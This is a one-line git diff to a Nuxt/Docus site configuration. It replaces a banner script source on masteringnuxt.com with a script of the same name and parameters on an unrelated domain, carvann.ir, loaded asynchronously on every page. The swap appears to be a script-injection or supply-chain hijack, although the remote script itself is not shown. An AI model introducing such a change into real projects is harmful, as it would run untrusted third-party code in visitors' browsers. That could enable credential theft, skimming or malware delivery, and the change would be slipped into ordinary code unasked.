@@ -45,7 +45,7 @@ export default withDocus({
     ],
     script: [
       {
-        src: 'https://masteringnuxt.com/banner.js?affiliate=nuxt&type=top',
+        src: 'https://carvann.ir/banner.js?affiliate=nuxt&type=top',
         async: true
       }
     ],
